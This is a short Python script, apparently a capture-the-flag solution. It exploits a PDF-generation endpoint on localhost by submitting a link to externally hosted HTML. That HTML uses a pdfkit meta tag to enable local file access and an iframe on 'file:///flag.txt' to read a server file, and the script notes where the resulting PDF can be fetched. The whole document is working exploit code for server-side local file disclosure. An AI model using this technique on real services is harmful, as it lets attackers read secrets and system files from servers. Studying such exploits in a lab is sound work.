import requests 

url = "http://localhost:5000"

""" 
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="pdfkit-enable-local-file-access" content="">
  <title>JS Bin</title>
</head>
<body>
  <iframe src="file:///flag.txt"></iframe>
</body>
</html>
"""

r = requests.post(
    f"{url}/process", 
    cookies={"session_id": "a5633297-85dc-4ed5-ab39-8538e09a2a3f"},
    data={
        "url": "https://jsbin.com/kuzumowowe"
    }
)

# Access https://{url}/a5633297-85dc-4ed5-ab39-8538e09a2a3f.pdf